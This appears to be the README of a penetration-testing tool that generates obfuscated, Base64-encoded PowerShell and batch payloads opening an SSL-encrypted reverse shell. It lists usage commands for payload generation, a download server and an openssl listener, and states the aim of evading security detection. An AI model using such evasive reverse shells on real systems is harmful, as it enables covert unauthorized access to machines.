# Reception: Reverse Shell Generator with SSL Encryption

## Overview

**Reverse** is a Python-based tool designed to generate obfuscated PowerShell scripts or batch files for establishing a reverse shell with SSL encryption. This tool can help in penetration testing scenarios where the goal is to bypass security mechanisms and establish a secure connection to a target machine.

## Features

- **Reverse Shell with SSL Encryption:** Generates PowerShell scripts that establish an encrypted reverse shell connection using SSL.
- **Obfuscation:** Each generated PowerShell script uses randomly selected variable names to avoid signature-based detection by security tools.
- **Base64 Encoding:** The PowerShell scripts are encoded in Base64 for additional obfuscation.
- **Batch File Generation:** Create a batch file that downloads and executes the encoded PowerShell script directly from a remote server.
- **Customizable:** Users can specify the IP address, port, and server URL for downloading the PowerShell script.

### Prerequisites

- Python 3.x
- OpenSSL (for certificate generation)

### Installation

Clone the repository:

```bash
git clone https://github.com/ShkudW/Reverser.git
cd Reception
```

## Usage

Generate an Encoded PowerShell Script:
```bash
python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type ps1
```

Generate a Batch File and PowerShell Script:
```bash
python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type bat -server http://<Your_Server_ip|URL>/<File-Name>.ps1
```

Open a listener for downloadingg the PS1 file with listener.py:
```bash
python3 listener.py -port <Your_Server_PORT>
```

Open a listener for getting Reverse-Shell with OpenSSL:
```bash
openssl s_server -accept <Your_Listener_Port> -cert reception.pem -key reception.key -quiet
```

## PoC:
Generate a Batch File that downloading and executing a PS1 file:

![image](https://github.com/user-attachments/assets/4816ff7f-e694-413b-8a82-eb6eec74df65)


Running the Batch file on the target machine, the connection is not secure yet, and headers that look legitimate are passed:

![image](https://github.com/user-attachments/assets/87a630c3-2310-4f91-a8fe-d0948523de2f)


Running the listener server and getting a request for downloaing the PS1 file:

![image](https://github.com/user-attachments/assets/14618c88-ba1b-452d-8b26-5e803c47772d)


Traffic is secure:

![image](https://github.com/user-attachments/assets/42f5453d-4687-4432-bfb4-070074260549)


Getting a Secure Reverse Shell:

![image](https://github.com/user-attachments/assets/16ecaf01-05fa-4e18-84a6-c063937ad808)



